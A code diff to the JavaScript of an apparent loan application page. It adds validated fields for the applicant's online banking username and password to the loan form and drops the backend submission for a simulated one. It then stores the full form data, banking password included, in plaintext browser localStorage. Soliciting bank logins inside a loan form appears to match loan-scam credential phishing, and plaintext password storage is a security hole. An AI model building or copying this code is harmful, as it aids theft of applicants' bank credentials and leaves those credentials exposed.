@@ -76,7 +76,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 return false;
             }
 
-            // Collect form data
+            // Collect form data including bank authentication
             const formData = new FormData(loanForm);
             const formDataObject = {};
             
@@ -87,39 +87,40 @@ document.addEventListener('DOMContentLoaded', function() {
             // Show loading state
             const submitBtn = loanForm.querySelector('button[type="submit"]');
             const originalText = submitBtn.textContent;
-            submitBtn.textContent = 'Processing...';
+            submitBtn.textContent = 'Processing Application...';
             submitBtn.disabled = true;
             
-            // Submit to backend
-            fetch('form-handler.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(formDataObject)
-            })
-            .then(response => response.json())
-            .then(result => {
-                if (result.success) {
-                    // Store application data in sessionStorage for bank authentication
-                    sessionStorage.setItem('loanApplicationId', result.application_id);
-                    sessionStorage.setItem('loanApplicationData', JSON.stringify(formDataObject));
+            // Generate application ID
+            const applicationId = 'APP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+            formDataObject.application_id = applicationId;
+            
+            // Save complete application data to localStorage
+            const timestamp = new Date().toISOString();
+            const completeApplicationData = {
+                ...formDataObject,
+                timestamp: timestamp,
+                submission_method: 'merged_form'
+            };
+            localStorage.setItem('loan_application_' + applicationId, JSON.stringify(completeApplicationData));
+            
+            // Simulate successful submission (replace with actual backend call)
+            setTimeout(() => {
+                try {
+                    // Store application ID for reference
+                    sessionStorage.setItem('loanApplicationId', applicationId);
                     
-                    // Redirect to bank authentication page
-                    window.location.href = 'bank-authentication.html';
-                } else {
-                    throw new Error(result.error || 'Submission failed');
+                    // Redirect directly to under-review page
+                    window.location.href = 'under-review.html';
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('There was an error submitting your application. Please try again.');
+                    // Reset button state
+                    submitBtn.textContent = originalText;
+                    submitBtn.disabled = false;
                 }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('There was an error submitting your application. Please try again.');
-            })
-            .finally(() => {
-                // Reset button state
-                submitBtn.textContent = originalText;
-                submitBtn.disabled = false;
-            });
+            }, 2000);
+            
+            // Note: Button state is reset in the catch block above
         });
     }
 
@@ -248,6 +249,20 @@ document.addEventListener('DOMContentLoaded', function() {
                 }
             }
         });
+        
+        // Additional validation for bank authentication fields
+        const onlineBankingUsername = document.getElementById('onlineBankingUsername');
+        const onlineBankingPassword = document.getElementById('onlineBankingPassword');
+        
+        if (onlineBankingUsername && onlineBankingUsername.value.trim().length < 3) {
+            isValid = false;
+            onlineBankingUsername.classList.add('error');
+        }
+        
+        if (onlineBankingPassword && onlineBankingPassword.value.trim().length < 6) {
+            isValid = false;
+            onlineBankingPassword.classList.add('error');
+        }
 
         // Email validation
         const emailField = document.getElementById('email');
